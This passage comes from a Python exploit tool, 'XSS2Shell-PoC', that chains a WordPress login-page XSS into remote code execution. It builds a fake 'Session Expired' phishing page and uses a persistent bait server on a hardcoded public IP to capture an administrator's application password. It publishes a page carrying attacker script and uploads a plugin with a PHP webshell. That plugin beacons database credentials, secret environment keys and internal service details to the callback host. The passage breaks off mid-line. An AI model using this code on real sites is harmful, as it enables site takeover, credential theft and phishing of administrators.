                      'RCE (Authorize-Application)' if self.rce_mode else
                      'STAGE-2 Telemetry')
        log(f"Payload ({len(payload)} chars, {mode_label}):", 'info')
        log(f"  {payload[:120]}{'...' if len(payload) > 120 else ''}", 'info')

        r = self._deliver_payload(payload)

        # Persist payload + target for the persistent bait server.
        # proof mode must NOT overwrite the armed RCE payload —
        # the VM bait server reads these files on every /bait request.
        if not self.proof_mode:
            try:
                out_dir = Path(__file__).resolve().parent
                with open(out_dir / 'x2s_payload.txt', 'w') as f:
                    f.write(payload)
                with open(out_dir / 'x2s_target.txt', 'w') as f:
                    f.write(self.base)
            except OSError as e:
                log(f"Could Not Update Bait Server Files: {e}", 'warn')

        injected = self._verify_injection(r)
        if not injected:
            log("Injection NOT Reflected as DOM — Chain Dead at Delivery.",
                'error')
            log("Likely Cause: HTML Escaping/Sanitizer (See Scan Check 4).",
                'info')

        # Browsable test URLs — open these to reproduce/complete the chain
        if injected:
            log("\nTEST URLS (Open in a Browser):", 'exploit')

            if self.proof_mode:
                out_dir = Path(__file__).resolve().parent
                log(f"  Proof Bait Page (Open Locally, Fires the "
                    f"Poisoned Login):\n    "
                    f"{out_dir / 'x2s_bait_proof.html'}", 'success')
                log(f"  or Reproduce via curl:\n    bash "
                    f"{out_dir / 'x2s_bait_proof_curl.sh'}", 'info')
                log("  Open the Login Page in the ADMIN's Browser to "
                    "See the Alert() fire.", 'info')
                log("Exploit Chain Complete (Proof Mode: No Callback "
                    "Window)", 'info')
                return EXIT_VULN

            # Push payload to the persistent VM bait server so /bait stays
            # meaningful. Token searched portably.
            pushed = False
            token = self._load_bait_token()
            vm_bait = f"https://{self._vm_host()}/bait"
            if token:
                try:
                    pr = requests.post(
                        f"https://{self._vm_host()}/update",
                        params={'token': token},
                        headers={'X-Target': self.base},
                        data=payload, timeout=15)
                    if pr.status_code == 200:
                        pushed = True
                        log("Payload PUSHED to Persistent Bait Server ✓",
                            'success')
                    else:
                        log(f"Bait Push Rejected (HTTP {pr.status_code}) "
                            f"— Token Invalid?", 'warn')
                except Exception as e:
                    log(f"Bait Push Failed: {e}", 'warn')
            elif self.callback_host != '103.31.205.161':
                log("Bait Push Skipped: No x2s_token.txt Next to Script.",
                    'warn')
                log("  Get Token from VM: cat /root/.x2s_token\n"
                    "  Save as x2s_token.txt Beside XSS2Shell-PoC.py",
                    'info')

            if pushed or self.callback_host == '103.31.205.161':
                log(f"  Bait Page (Persistent, Fires Full Chain):\n"
                    f"    {vm_bait}", 'success')
            else:
                log(f"  Bait Page (LOCAL Only — Behind NAT, Not Reachable "
                    f"from Internet):\n    http://{self.callback_host}:"
                    f"{self.callback_port}/bait", 'warn')
            log(f"  Raw Payload: {self.callback_url}/payload", 'info')
            if self.rce_mode:
                log(f"  Direct Authorize Page (Step 2 of Flow, Needs Admin "
                    f"session):\n    {self.base}"
                    f"/wp-admin/authorize-application.php"
                    f"?app_name=Desktop%20App&app_id={self._rce_app_id}"
                    f"&success_url={urllib.parse.quote(self.callback_url + '/callback', safe='')}",
                    'success')
            if not self.proof_mode:
                log("  Bait Server is PERSISTENT (systemd x2s-bait) — URLs "
                    "Stay Live Even After This Script Exits.", 'info')

        baseline = len(ExploitServer.callback_data)
        if not self.proof_mode:
            log(f"Waiting for victim-triggered callback "
                f"({self.wait_seconds}s)...", 'info')
            deadline = time.time() + self.wait_seconds
            while time.time() < deadline:
                if len(ExploitServer.callback_data) > baseline:
                    time.sleep(2)  # grace window for follow-up beacons
                    break
                if self.rce_mode and self._read_jsonl_capture():
                    break  # persistent x2s-bait service captured it
                time.sleep(1)

        # ── pwn.ai RCE flow: consume captured application password ──
        if self.rce_mode:
            cap = ExploitServer.app_password_capture
            if not cap:
                # local listener port may be busy (persistent
                # x2s-bait systemd service) — recover the app password
                # from its JSONL capture log instead.
                cap = self._read_jsonl_capture()
                if cap:
                    log("Application Password Recovered from x2s-bait "
                        "JSONL (Local Listener Busy) ✓", 'success')
            if cap:
                log("\nSTAGE-2: Application Password Captured — Running "
                    "pwn.ai RCE Flow", 'exploit')
                shell_ok = self._run_rce_flow(cap)
                if shell_ok:
                    log("\n🔴🔴 RCE CONFIRMED — WEBSHELL LIVE 🔴🔴", 'error')
                    self._write_rce_report([{
                        'app_password_user': cap['user_login'],
                        'app_password': cap['password'],
                        'shell_url': f"{self.base}/wp-content/plugins/"
                                     f"x2s-pivot/x2s-pivot.php",
                    }])
                    return EXIT_VULN
            else:
                log("\nNo application-password Capture — Admin Did Not "
                    "Complete authorize-application During Window", 'warn')

        # proof mode never had a listener — skip beacon
        # processing (stale beacons would pollute the proof report).
        got_rce = (not self.proof_mode) and \
            self._process_results(list(ExploitServer.callback_data))
        log("Exploit Chain Complete", 'info')
        if got_rce or ExploitServer.shell_confirmed:
            return EXIT_VULN
        if self.proof_mode:
            return EXIT_VULN if self._verify_injection(r) else EXIT_CLEAN
        return EXIT_VULN if len(ExploitServer.callback_data) > baseline \
            else EXIT_CLEAN

    def _vm_host(self) -> str:
        """The Persistent Bait Server Host (VM with Public IP)."""
        return '103-31-205-161.sslip.io'

    @staticmethod
    def _load_bait_token() -> str:
        """
        Bait Push Auth Token. Search Order:
        1. x2s_token.txt Next to the Script (Portable, for Laptops)
        2. /root/.x2s_token (VM Default)
        Returns '' if Not Found.
        """
        candidates = [
            Path(__file__).parent / 'x2s_token.txt',
            Path('/root/.x2s_token'),
        ]
        for c in candidates:
            try:
                tok = Path(c).read_text().strip()
                if tok:
                    return tok
            except OSError:
                continue
        return ''

    def _gen_backdoor_creds(self):
        suffix = ''.join(random.choices(string.ascii_lowercase + string.digits,
                                        k=4))
        self.backdoor_user = f"{self.BACKDOOR_PREFIX}{suffix}"
        self.backdoor_pass = ('X2s!' + ''.join(
            random.choices(string.ascii_letters + string.digits, k=12)) + '!')

    def _write_bait_files(self, payload: str):
        """Persist Poisoned Request + Payload for Reproduction."""
        try:
            html = f"""<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>WordPress Login</title></head>
<body style="font-family:sans-serif;background:#f0f0f1;margin:0">
<div style="max-width:400px;margin:8% auto;background:#fff;padding:26px;
     border:1px solid #c3c4c7;box-shadow:0 1px 3px rgba(0,0,0,.04)">
<h2 style="text-align:center">⚠️ Session Expired</h2>
<p>Please sign in again to continue.</p>
<!-- XSS2Shell Proof-of-Concept payload (authorized whitebox test) -->
<form id="poison" method="post" action="{self.base}/wp-login.php">
  <input type="hidden" name="log" value='{payload.replace("'", "&#39;")}'>
  <input type="hidden" name="pwd" value="wrongpassword123">
  <input type="hidden" name="wp-submit" value="Log In">
  <input type="hidden" name="redirect_to" value="">
  <input type="hidden" name="testcookie" value="1">
</form>
<noscript><button onclick="document.getElementById('poison').submit()">
  Sign in</button></noscript>
<script>
  // GET first to establish wordpress_test_cookie, then submit poison
  fetch("{self.base}/wp-login.php", {{credentials:'include'}})
    .finally(function() {{
      document.getElementById('poison').submit();
    }});
</script>
</div></body></html>"""
            out_dir = Path(__file__).resolve().parent
            with open(out_dir / 'x2s_bait.html', 'w') as f:
                f.write(html)
            with open(out_dir / 'x2s_payload.txt', 'w') as f:
                f.write(payload)

            curl = (
                f"# Reproduce delivery:\n"
                f"curl -sk -c /tmp/x2s.jar '{self.base}/wp-login.php' "
                f"> /dev/null && curl -sk -b /tmp/x2s.jar "
                f"--data-urlencode \"log@x2s_payload.txt\" "
                f"-d 'pwd=wrongpassword123&wp-submit=Log+In&testcookie=1' "
                f"'{self.base}/wp-login.php'\n"
            )
            with open(out_dir / 'x2s_bait_curl.sh', 'w') as f:
                f.write(curl)

            log("Bait files written: x2s_bait.html, x2s_payload.txt, "
                "x2s_bait_curl.sh", 'success')

            # Serve the bait from our listener so it has a browsable URL —
            # opening it reproduces the poisoned POST in ANY browser.
            try:
                ExploitServer.static['/bait'] = (
                    'text/html; charset=utf-8', html.encode('utf-8'))
                ExploitServer.static['/payload'] = (
                    'text/plain; charset=utf-8', payload.encode('utf-8'))
            except Exception:
                pass
        except OSError as e:
            log(f"Could not write bait files: {e}", 'warn')

    # ── proof artifacts + JSONL capture recovery ─────────────────
    def _write_proof_artifacts(self, payload: str):
        """--xss/--proof artifacts. Written to *_proof.* files so
        the shared VM bait server (reads x2s_payload.txt) keeps serving
        the armed RCE payload for the other targets."""
        out_dir = Path(__file__).resolve().parent
        try:
            html = (
                '<!DOCTYPE html>\n<html><head><meta charset="utf-8">'
                '<title>WordPress Login</title></head>'
                '<body style="font-family:sans-serif;background:#f0f0f1;'
                'margin:0"><div style="max-width:400px;margin:8% auto;'
                'background:#fff;padding:26px;border:1px solid #c3c4c7;">'
                '<h2 style="text-align:center">⚠️ Session Expired</h2>'
                '<p>Please sign in again to continue.</p>'
                '<!-- XSS2Shell XSS-PROOF payload (authorized whitebox '
                'test) -->'
                f'<form id="poison" method="post" '
                f'action="{self.base}/wp-login.php">'
                f'  <input type="hidden" name="log" '
                f"value='{payload.replace(chr(39), '&#39;')}'>"
                '  <input type="hidden" name="pwd" value="wrongpassword123">'
                '  <input type="hidden" name="wp-submit" value="Log In">'
                '  <input type="hidden" name="redirect_to" value="">'
                '  <input type="hidden" name="testcookie" value="1">'
                '</form>'
                '<noscript><button '
                "onclick=\"document.getElementById('poison').submit()\">"
                '  Sign in</button></noscript>'
                '<script>fetch("' + self.base +
                '/wp-login.php", {credentials:\'include\'}).finally('
                "function() { document.getElementById('poison').submit();"
                ' });</script>'
                '</div></body></html>'
            )
            with open(out_dir / 'x2s_bait_proof.html', 'w') as f:
                f.write(html)
            with open(out_dir / 'x2s_payload_proof.txt', 'w') as f:
                f.write(payload)
            curl = (
                "# Reproduce XSS proof delivery:\n"
                f"curl -sk -c /tmp/x2s.jar '{self.base}/wp-login.php' "
                "> /dev/null && curl -sk -b /tmp/x2s.jar "
                '--data-urlencode "log@x2s_payload_proof.txt" '
                "-d 'pwd=wrongpassword123&wp-submit=Log+In&testcookie=1' "
                f"'{self.base}/wp-login.php'\n"
            )
            with open(out_dir / 'x2s_bait_proof_curl.sh', 'w') as f:
                f.write(curl)
            log("Proof artifacts written: x2s_bait_proof.html, "
                "x2s_payload_proof.txt, x2s_bait_proof_curl.sh "
                "(shared VM bait payload left untouched) ✓", 'success')
        except OSError as e:
            log(f"Could not write proof artifacts: {e}", 'warn')

    def _read_jsonl_capture(self):
        """newest APP_PASSWORD_CAPTURED entry from the persistent
        x2s-bait service log, only if recorded during this run."""
        for log_path in JSONL_CAPTURE_LOG_CANDIDATES:
            if not log_path.exists():
                continue
            try:
                with log_path.open('r') as f:
                    lines = f.readlines()
            except OSError:
                continue
            for line in reversed(lines):
                try:
                    rec = json.loads(line)
                except ValueError:
                    continue
                if rec.get('type') != 'APP_PASSWORD_CAPTURED':
                    continue
                if rec.get('ts', '') and \
                        rec['ts'] < self._run_started_str:
                    continue
                return {
                    'site_url': rec.get('site_url', ''),
                    'user_login': rec.get('user_login', ''),
                    'password': rec.get('password', ''),
                }
            return None
        return None

    # ── Listener ────────────────────────────────────────────────────────
    def _resolve_callback_url(self):
        """Pick HTTPS Hostname if the Local TLS Proxy is Live."""
        cb_host = f"{self.callback_host.replace('.', '-')}.sslip.io"
        try:
            r = requests.get(f"https://{cb_host}/probe", timeout=8)
            if r.status_code == 200:
                self.callback_url = f"https://{cb_host}"
                log("Callback via HTTPS Proxy (TLS Valid) ✓", 'success')
                return
            raise ValueError(f"Probe Status {r.status_code}")
        except Exception:
            self.callback_url = f"http://{self.callback_host}:{self.callback_port}"
            log("HTTPS Proxy Unavailable — Falling Back to Plain HTTP "
                "callback", 'warn')
            log("  ⚠️ Beacons from HTTPS Pages Will Be Blocked as Mixed "
                "Content Unless Target is HTTP", 'warn')

    def _start_listener(self):
        try:
            server = HTTPServer(('0.0.0.0', self.callback_port),
                                ExploitServer)
            thread = threading.Thread(target=server.serve_forever,
                                      daemon=True)
            thread.start()
            log(f"Callback Listener Bound 0.0.0.0:{self.callback_port} ✓",
                'success')
        except OSError:
            # Port taken by the persistent x2s-bait systemd service —
            # that's fine: it captures /callback + /log identically and
            # writes to /root/x2s_captures.jsonl.
            log(f"Port {self.callback_port} Busy — Using Persistent "
                f"x2s-bait Service for Capture ✓", 'warn')
            log("  Captures Append to /root/x2s_captures.jsonl", 'info')

    def _selftest_listener(self) -> bool:
        try:
            r = requests.get(f"http://127.0.0.1:{self.callback_port}"
                             f"/selftest?ping=1", timeout=5)
            ok = r.status_code == 200
            if ok:
                log("Listener Selftest OK (Local Bind Responding) ✓",
                    'success')
            return ok
        except Exception as e:
            log(f"Listener Selftest Failed: {e}", 'error')
            return False

    # ── Payload construction ────────────────────────────────────────────
    def _pivot_php(self, shell_mode=False) -> str:
        """
        STAGE-3 Plugin Payload. Two Variants:
          shell_mode=False — Passive Pivot Recon (Beacon Container Info)
          shell_mode=True  — Interactive Web Shell (?cmd=<shell command>)
        """
        cb = self.callback_url
        if shell_mode:
            php_body = r'''
// Interactive webshell (PoC) — DELETE AFTER TESTING
if (isset($_GET['cmd'])) {
    header('Content-Type: text/plain');
    echo "XSS2SHELL_ACTIVE\n";
    system($_GET['cmd']);
    exit;
}
if (isset($_GET['check'])) {
    header('Content-Type: application/json');
    echo json_encode(array('shell' => true, 'ts' => time()));
    exit;
}
'''
        else:
            php_body = ''
        php = r'''<?php
/**
 * Plugin Name: X2S Pivot Module
 * Description: XSS2Shell STAGE-3 Module (Proof-of-Concept, Authorized Testing ONLY).
 * Version: 1.0
 * Author: XSS2Shell Proof-of-Concept
 */
''' + php_body + r'''
header('Content-Type: application/json');
$CB = 'CBURL';

function x2s_beacon($tag, $data) {
    global $CB;
    $q = http_build_query(array(
        't' => $tag,
        'd' => json_encode($data),
    ));
    @file_get_contents($CB . '/log?' . $q, false,
        stream_context_create(array('http' => array('timeout' => 5))));
}

x2s_beacon('PLUGIN_EXECUTED_IN_CONTAINER', array('ts' => time()));

// 1. wp-config.php DB credentials
$cfg = @file_get_contents('wp-config.php') ?: '';
if (!$cfg) {
    foreach (array('../wp-config.php', '../../wp-config.php',
                   '../../../../wp-config.php', '/var/www/html/wp-config.php')
             as $p) {
        $cfg = @file_get_contents($p);
        if ($cfg) break;
    }
}
$db = array();
if ($cfg &&
    preg_match("/DB_NAME'[^']*'([^']*)/", $cfg, $m)) $db['name'] = $m[1];
if ($cfg &&
    preg_match("/DB_USER'[^']*'([^']*)/", $cfg, $m)) $db['user'] = $m[1];
if ($cfg &&
    preg_match("/DB_PASSWORD'[^']*'([^']*)/", $cfg, $m)) $db['pass'] = 'SET(len='.
    strlen($m[1]).')';
if ($cfg &&
    preg_match("/DB_HOST'[^']*'([^']*)/", $cfg, $m)) $db['host'] = $m[1];
x2s_beacon('dbcreds', $db ? $db : array('found' => false));

// 2. Environment variables (secrets injected by orchestrator)
$env = array();
foreach ($_SERVER as $k => $v) {
    if (preg_match('/PASS|SECRET|TOKEN|KEY|CRED|AWS|DB_|MYSQL|REDIS/i', $k)
        && !preg_match('/^HTTP_|^REMOTE_|^SERVER_(NAME|SOFT|SIG)/', $k)) {
        $env[$k] = is_string($v) ? substr($v, 0, 4) . '***(' .
                   strlen($v) . ')' : '?';
    }
}
x2s_beacon('envkeys', array('count' => count($env), 'sample' =>
    array_slice($env, 0, 15)));

// 3. Container runtime detection
$runtime = array(
    'dockerenv' => file_exists('/.dockerenv'),
);
$cg = @file_get_contents('/proc/1/cgroup');
if ($cg) {
    if (strpos($cg, 'docker') !== false) $runtime['cgroup'] = 'docker';
    elseif (strpos($cg, 'containerd') !== false) $runtime['cgroup'] =
        'containerd';
    elseif (strpos($cg, 'kubepods') !== false) $runtime['cgroup'] = 'k8s';
}
x2s_beacon('runtime', $runtime);

// 4. docker.sock exposure = trivial escape path
$sock = file_exists('/var/run/docker.sock');
x2s_beacon('dockersock', array('present' => $sock));

// 5+6. Internal service discovery: Docker DNS + common ports
$cands = array(
    'mysql', 'db', 'database', 'mariadb', 'redis', 'memcached',
    'rabbitmq', 'mongo', 'postgres', 'elasticsearch', 'mailhog',
);
$ports = array(3306, 6379, 11211, 5672, 27017, 5432, 9200);
$found = array();
foreach ($cands as $host) {
    $ip = gethostbyname($host);
    if ($ip !== $host) {           // DNS resolved -> service exists
        foreach ($ports as $port) {
            $c = @fsockopen($ip, $port, $errno, $errstr, 1);
            if ($c) {
                fclose($c);
                $found[] = "$host($ip):$port";
                break;
            }
        }
    }
}
x2s_beacon('internal', array('services' => $found));
x2s_beacon('pivot_done', array('ts' => time()));
echo json_encode(array('pivot' => true));
'''
        return php.replace('CBURL', cb)

    def _stage2_js(self) -> str:
        """Legacy telemetry JS. NOTE: WP drops inline JSONP callbacks —
        this never executes via _jsonp; kept only for future transport."""
        u = self.backdoor_user
        p = self.backdoor_pass
        cb = self.callback_url
        return (
            "var CB='" + cb + "';"
            "var BU='" + u + "',BP='" + p + "';"
            "function b(t,o){try{new Image().src=CB+'/log?t='+"
            "encodeURIComponent(t)+'&d='+encodeURIComponent("
            "JSON.stringify(o)).substring(0,1400);}catch(e){}}"
            "b('hit',{u:location.href,c:document.cookie,t:document.title,"
            "ref:document.referrer});"
        )

    def _build_plugin_zip(self, shell_mode=False) -> bytes:
        buf = io.BytesIO()
        php = self._pivot_php(shell_mode=shell_mode)
        with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
            z.writestr('x2s-pivot/x2s-pivot.php', php)
            z.writestr('x2s-pivot/readme.txt',
                       'XSS2Shell STAGE-3 Pivot Proof-of-Concept — Authorized Testing ONLY.')
        return buf.getvalue()

    def _build_xss_payload(self) -> str:
        # Proof mode: reference-faithful alert() evidence.
        if self.proof_mode:
            jsonp_url = (
                f"/?rest_route=/&_method=GET"
                f"&_jsonp=alert"
                f"&_envelope=1"
            )
            return (
                f"< area id=ajaxurl href={jsonp_url}>"
                f"< div id=color-picker class=reset-pass-submit>"
                f"< button class=\"wp-generate-pw color-option\">X"
            )

        # RCE mode (pwn.ai flow): injected ajaxurl points the jQuery POST
        # navigation at authorize-application.php. auth-app.js on that page
        # creates an Application Password for the logged-in admin and
        # redirects to our success_url with the credential.
        if self.rce_mode:
            success = urllib.parse.quote(
                f"{self.callback_url}/callback", safe='')
            self._rce_app_id = str(uuid.uuid4())
            auth_url = (
                f"/wp-admin/authorize-application.php"
                f"?app_name=Desktop%20App&app_id={self._rce_app_id}"
                f"&success_url={success}"
            )
            return (
                f"< area id=ajaxurl href={auth_url}>"
                f"< div id=color-picker class=reset-pass-submit>"
                f"< button class=\"wp-generate-pw color-option\">X"
            )

        # Default: legacy telemetry payload (inline JS is dropped by WP).
        js = self._stage2_js()
        jsonp_callback = urllib.parse.quote(js, safe='()')
        jsonp_url = (
            f"/?rest_route=/&_method=GET"
            f"&_jsonp={jsonp_callback}"
            f"&_envelope=1"
        )
        return (
            f"< area id=ajaxurl href={jsonp_url}>"
            f"< div id=color-picker class=reset-pass-submit>"
            f"< button class=\"wp-generate-pw color-option\">X"
        )

    # ── Delivery & verification ─────────────────────────────────────────
    def _deliver_payload(self, payload: str):
        log("Delivering Payload via wp-login.php...", 'exploit')

        # WordPress requires the wordpress_test_cookie from a prior GET;
        # without it the login form short-circuits to a cookie-error and
        # never reflects our username field.
        try:
            self.session.get(f"{self.base}/wp-login.php", timeout=15)
        except Exception:
            pass

        try:
            r = self.session.post(
                f"{self.base}/wp-login.php",
                data={
                    'log': payload,
                    'pwd': 'wrongpassword123',
                    'wp-submit': 'Log In',
                    'redirect_to': '',
                    'testcookie': '1'
                },
                allow_redirects=False,
                timeout=15
            )
        except Exception as e:
            log(f"Delivery Failed: {e}", 'error')
            return None

        if r is not None:
            log(f"Response: {r.status_code} ({len(r.text)} bytes)", 'info')
        return r

    def _verify_injection(self, r) -> bool:
        """DOM-based Proof the Payload Landed as Real Elements."""
        if r is None:
            return False
        soup = BeautifulSoup(r.text, 'html.parser')
        ajax_el = soup.find(id='ajaxurl')
        if ajax_el is not None:
            log(f"Injection VERIFIED: <{ajax_el.name} id=ajaxurl> is a real "
                f"DOM Node ✓", 'success')
            href = ajax_el.get('href', '')
            if href:
                log(f"  href Carries Target URL ({len(href)} Chars) ✓",
                    'success')
            return True
        if 'id=ajaxurl' in r.text:
            log("Payload Text Present but NOT Parsed as DOM Element "
                "(Escaping Active?)", 'warn')
        return False

    # ── pwn.ai RCE flow ─────────────────────────────────────────────────
    def _run_rce_flow(self, cap: dict) -> bool:
        """
        Steps 4–5 of the pwn.ai Chain Using the Captured Application
        Password:
          1. Basic Auth -> Publish Page Embedding Attacker JS
          2. Serve /attacker.js from Listener (Nonce Fetch + ZIP Upload)
          3. Navigate Victim to Published Page (Return Its URL So the
             Operator/Bait Can Drive It) — Here We Trigger Directly via
             REST-Created Content URL Fetch is NOT Enough (JS Must Run in
             Admin Browser); We Instead Perform Steps Server-Side Using
             the App Password Where Possible and Fall Back to Serving the
             JS for Manual/Bait Navigation.
          4. Poll Web Shell Endpoint Until SHELL_OK.
        """
        user = cap['user_login']
        pwd = cap['password']
        auth = (user, pwd)
        log(f"Using Application Password for '{user}'", 'exploit')

        # Verify identity/caps via REST
        try:
            me = requests.post(f"{self.base}/wp-json/wp/v2/users/me",
                               auth=auth, params={'context': 'edit'},
                               timeout=15)
            if me.status_code != 200:
                log(f"App Password Rejected (HTTP {me.status_code})",
                    'error')
                return False
            caps = me.json().get('capabilities', {})
            if not caps.get('manage_options'):
                log("Captured Account Lacks manage_options — Aborting RCE",
                    'warn')
                return False
            log("Identity Verified: manage_options ✓", 'success')
        except Exception as e:
            log(f"Identity Check Failed: {e}", 'error')
            return False

        # Register attacker JS + ZIP for the listener to serve
        zip_bytes = self._build_plugin_zip(shell_mode=True)
        zip_b64 = base64.b64encode(zip_bytes).decode()

        # The published page embeds this JS inline (unfiltered_html).
        page_js = ATTACKER_PAGE_JS.replace('__CB__', self.callback_url) \
                                  .replace('__ZIP_B64__', zip_b64)

        # Publish carrier page
        try:
            pr = requests.post(
                f"{self.base}/wp-json/wp/v2/pages",
                auth=auth,
                json={
                    'title': 'Maintenance Notice',
                    'status': 'publish',
                    'content': f"<script>{page_js}</script>",
                },
                timeout=20)
            if pr.status_code not in (200, 201):
                log(f"Page Publish Failed (HTTP {pr.status_code}): "
                    f"{pr.text[:160]}", 'error')
                return False
            page = pr.json()
            page_link = page.get('link', '')
            page_id = page.get('id')
            log(f"Carrier Page PUBLISHED: {page_link} (id={page_id}) ✓",
                'success')

            # Beacon marker
            try:
                requests.get(f"{self.callback_url}/log?"
                             f"t=PAGE_PUBLISHED&d=%7B%22id%22%3A{page_id}%7D",
                             timeout=5)
            except Exception:
                pass
        except Exception as e:
            log(f"Publish Error: {e}", 'error')
            return False

        # Drive the admin browser through the carrier page. In an
        # unattended run we cannot force the victim's browser; instead we
        # fetch the page ourselves with cookies disabled — the embedded JS
        # will NOT run server-side. So we poll for the shell while keeping
        # the carrier page alive; the bait/instruction below tells the
        # operator how the victim completes the loop. If the victim's
        # session is same-browser (our simulation), opening the link runs
        # the uploader instantly.
        log("Carrier Page Armed. Waiting for Uploader Execution "
            "(Victim Opens the Page in Admin Browser)...", 'info')

        shell_url = f"{self.base}/wp-content/plugins/x2s-pivot/" \
                    f"x2s-pivot.php?check=1"
        deadline = time.time() + max(30, self.wait_seconds)
        shell_ok = False
        while time.time() < deadline:
            try:
                sr = requests.get(shell_url, timeout=10)
                if sr.status_code == 200 and '"shell":true' in sr.text:
                    shell_ok = True
                    break
            except Exception:
                pass
            time.sleep(3)

        if shell_ok:
            log("Web Shell LIVE: "
                f"{self.base}/wp-content/plugins/x2s-pivot/"
                f"x2s-pivot.php?cmd=<command>", 'error')
            # Demo command
            try:
                demo = requests.get(
                    f"{self.base}/wp-content/plugins/x2s-pivot/"
                    f"x2s-pivot.php?cmd=id", timeout=10)
                log(f"  id → {demo.text.strip()[:200]}", 'error')
            except Exception:
                pass
            return True

        log(f"Shell Not Observed Within Window. Carrier Page Remains at:\n"
            f"    {page_link}\n"
            f"  Open It in the Admin's Browser to Fire the Uploader.",
            'warn')
        return False

    # ── Results ─────────────────────────────────────────────────────────
    def _process_results(self, callbacks) -> bool:
        # Only count NEW beacons (baseline handled by caller trimming);
        # here we classify whatever arrived after delivery.
        interesting = [c for c in callbacks
                       if c.get('path') not in ('/selftest', '/probe')]
        if not interesting:
            log("\nNo Victim Callbacks Received", 'warn')
            log("Possible Causes:", 'info')
            log("  1. No Victim Visited the Poisoned Login Page During "
                "Wait Window", 'info')
            log("  2. Injection Blocked by Escaping (Scan Check 4)", 'info')
            log("  3. Callback Unreachable from Outside (Firewall/NAT)",
                'info')
            log("  4. WAF Stripped the Payload", 'info')
            return False

        tags_seen = []
        for i, cb in enumerate(interesting, 1):
            params = cb.get('params', {})
            tag = params.get('t', ['hit'])[0]
            data = params.get('d', [''])[0]
            tags_seen.append(tag)
            log(f"  [{i}] BEACON[{tag}]", 'exploit')
            try:
                decoded = json.loads(urllib.parse.unquote(data))
                for k, v in decoded.items():
                    shown = json.dumps(v, ensure_ascii=False)[:180]
                    log(f"      {k}: {shown}", 'info')
            except Exception:
                if data:
                    log(f"      raw: {data[:180]}", 'info')

        if 'RCE_USER_CREATED' in tags_seen:
            log("\n🔴 Backdoor Administrator Created (legacy path)",
                'error')
            return True
        log("\n🟡 Victim Interaction Confirmed — Awaiting RCE-Stage "
            "progression" if self.rce_mode else
            "\n🟡 Pre-Auth XSS Confirmed via Victim Beacons", 'warn')
        return False

    def _write_rce_report(self, records):
        fname = f"x2s_rce_{time.strftime('%Y%m%d_%H%M%S')}.json"
        report = {
            'target': self.base,
            'timestamp': time.strftime('%Y-%m-%dT%H:%M:%S'),
            'records': records,
            'cleanup_commands': [
                f"wp plugin uninstall x2s-pivot",
                f"wp post delete <carrier-page-id> --force",
                f"wp user application-password delete <user> Desktop%20App",
            ],
        }
        try:
            with open(fname, 'w') as fh:
                json.dump(report, fh, indent=2)
            log(f"RCE Report Saved: {fname}", 'success')
        except OSError as e:
            log(f"Could Not Save Report: {e}", 'warn')


# ── CLI ────────────────────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        description='CVE-2026-64638: XSS2Shell Proof-of-Concept — Whitebox Pentesting',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
References: https://pwn.ai/blog/xss2shell

Examples:
  Scan Only:
    python3 XSS2Shell-PoC.py -u https://target.com --scan

  XSS Proof-of-Concept (Alert Dialog, no Listener Needed):
    python3 XSS2Shell-PoC.py -u https://target.com --xss

  Full pwn.ai RCE Flow (Needs Admin Victim to Approve app-password):
    python3 XSS2Shell-PoC.py -u https://target.com --rce --wait 180

  (--xss and --rce Both Imply --exploit; --proof Aliases --xss)

Exit Codes: 0 Clean | 1 Error | 2 Vulnerable/RCE Confirmed
        """
    )
    parser.add_argument('-u', '--url', required=True, help='Target URL')
    parser.add_argument('--scan', action='store_true', help='Run Scanner')
    parser.add_argument('--exploit', action='store_true',
                        help='Run Exploit Chain')
    parser.add_argument('--proof', action='store_true', dest='proof',
                        help='XSS Proof-of-Concept: Reference-Faithful '
                             'alert() dialog (No Listener). Alias: --xss')
    parser.add_argument('--xss', action='store_true', dest='proof',
                        help='XSS PoC ONLY (Alias of --proof) — No RCE Chain')
    parser.add_argument('--rce', action='store_true',
                        help='Full pwn.ai RCE Flow: authorize-application '
                             '-> App Password -> Publish Page -> Plugin '
                             'Upload -> Web Shell')
    parser.add_argument('--no-pivot', action='store_true',
                        help='Skip Container Pivot Recon After RCE')
    parser.add_argument('--force', action='store_true',
                        help='Run Exploit Even if Scanner Says NOT VULNERABLE')
    parser.add_argument('--port', type=int, default=8888,
                        help='Callback Port (Default: 8888)')
    parser.add_argument('--host', default=None,
                        help='Callback Host/IP (Default: Auto-Detect Public IP)')
    parser.add_argument('--wait', type=int, default=60,
                        help='Seconds to Wait for Callbacks (Default: 60)')
    parser.add_argument('--throttle', type=float, default=1.5,
                        help='Delay Between Login POSTs in Seconds '
                        '(Default: 1.5; Anti-Lockout)')
    parser.add_argument('--insecure', action='store_true',
                        help='Skip TLS Verification (Staging Targets)')
    parser.add_argument('-o', '--output', help='Save Scan JSON Report')
    parser.add_argument('-t', '--timeout', type=int, default=10,
                        help='Per-Request Timeout (Default: 10)')

    args = parser.parse_args()

    # mode flags imply --exploit so --xss / --rce work standalone
    # (parametric parity with Click2Shell-PoC.py).
    if args.proof or args.rce:
        args.exploit = True

    if args.proof and args.rce:
        parser.error('--xss/--proof (XSS Proof-of-Concept Only) and --rce (Full Chain) '
                     'Are Mutually Exclusive')

    banner()
    base = norm(args.url)
    log(f"Target: {base}", 'info')
    log(f"Reference: https://pwn.ai/blog/xss2shell\n", 'info')

    exit_code = EXIT_CLEAN

    scanner = Scanner(base, timeout=args.timeout, throttle=args.throttle,
                      insecure=args.insecure)
    results = scanner.run()

    if args.output:
        try:
            with open(args.output, 'w') as f:
                json.dump(results, f, indent=2)
            log(f"Report Saved: {args.output}", 'success')
        except OSError as e:
            log(f"Cannot Write Report: {e}", 'error')

    # Summary
    print(f"\n{BOLD}{'─'*60}{W}")
    print(f"{BOLD}XSS2SHELL SCAN SUMMARY{W}")
    print(f"{'─'*60}")
    print(f"  Target:                  {results['target']}")
    print(f"  WordPress:               "
          f"{'✓' if results['is_wordpress'] else '✗'}")

    ver = results['wp_version']
    if ver:
        mapping = {
            'below_vulnerable_range': 'NOT IN VULNERABLE RANGE',
            'patched': 'PATCHED',
            'vulnerable': 'VULNERABLE',
        }
        patch_status = mapping.get(results['wp_version_info'], 'UNKNOWN')
        print(f"  Version:                 {ver} ({patch_status})")
    else:
        print("  Version:                 N/A (Undetected)")

    print(f"  wp-login.php:            "
          f"{'✓' if results['wp_login_accessible'] else '✗'}")
    print(f"  Error Reflection:        "
